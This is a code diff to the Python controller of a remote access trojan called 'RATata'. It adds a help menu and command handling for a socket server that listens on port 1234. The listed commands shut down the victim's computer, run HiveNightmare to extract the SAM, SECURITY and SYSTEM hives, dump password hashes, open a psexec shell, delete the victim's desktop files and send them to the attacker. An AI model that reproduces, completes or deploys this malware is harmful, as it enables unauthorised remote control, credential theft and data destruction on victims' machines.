@@ -12,13 +12,52 @@ def connectToMachine():
     proc = subprocess.Popen(cmnd, cwd=dir, shell=True)
     proc.wait() #wait until the process (psexec.py) to finish to continue the normal program
 
+logo = """
+====================================================================
+$$$$$$$\  $$$$$$\$$$$$$$$\       $$\              
+$$  __$$\$$  __$$\__$$  __|      $$ |             
+$$ |  $$ $$ /  $$ | $$ |$$$$$$\$$$$$$\   $$$$$$\  
+$$$$$$$  $$$$$$$$ | $$ |\____$$\_$$  _|  \____$$\ 
+$$  __$$<$$  __$$ | $$ |$$$$$$$ |$$ |    $$$$$$$ |
+$$ |  $$ $$ |  $$ | $$ $$  __$$ |$$ |$$\$$  __$$ |
+$$ |  $$ $$ |  $$ | $$ \$$$$$$$ |\$$$$  \$$$$$$$ |
+\__|  \__\__|  \__| \__|\_______| \____/ \_______|
+====================================================================
+Awaiting connection ...
+====================================================================
+"""
+
+help = """
+====================================================================
+Available commands: ↓
+====================================================================
+s                       - Shutdown the victim's computer and closes RATata
+openCalc                - Open calculator
+test                    - Prints the contents of victim's desktop
+retrieveh               - Executes HiveNightmare.exe and extracts the 
+                          SAM, SECURITY and SYSTEM hives as files on the victims pc
+hashdump                - Dumps the hashes and prints them
+getaccess               - Starts an attempt to create an interactive shell 
+                          on the victim's machine (you need the hashes and 
+                          user's name from hashdump, type "exit" to leave the shell)
+DeleteFiles-Desktop     - Prints the contents of the victim's desktop and 
+                          ask for the name of the file to be deleted.
+                          It then deletes this file.
+SendFiles-Desktop       - Prints the contents of the victim's desktop and 
+                          ask for the name of the file to be sent over 
+                          to your computer (currently works with .txt files)
+
+terminate               - Close the connection and the program
+====================================================================
+"""
+print(logo)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0", 1234))
 s.listen(5)
 clientsocket, address = s.accept()
 # now our endpoint knows about the OTHER endpoint.s
 print(f"Connection from {address} has been established.")
-
+print("====================================================================")
 # Server sends message and waits for reply
 
 # To ensure that the person knows what to use there could be a help option
@@ -29,7 +68,9 @@ while True:
     ## NOT TESTED YET ##############################################
     # This should create a new terminal that is connected to the victim machine
     # If the correct account is chosen, this terminal will have admin privileges
-    if msgToSend == "getaccess":
+    if msgToSend == "help":
+        print(help)
+    elif msgToSend == "getaccess":
         connectToMachine()
     ################################################################
     # Closes the socket and terminates the connection (hopefully) ##
@@ -60,10 +101,12 @@ while True:
             f.close()
     else:
         clientsocket.send(bytes(msgToSend,"utf-8"))
-        #this does not work currently since it gets an error
         msg = clientsocket.recv(2048)
         decodedMsg = msg.decode("utf-8")
         print(decodedMsg)
+        if msgToSend == "s":
+            s.close()
+            break
 
 
 
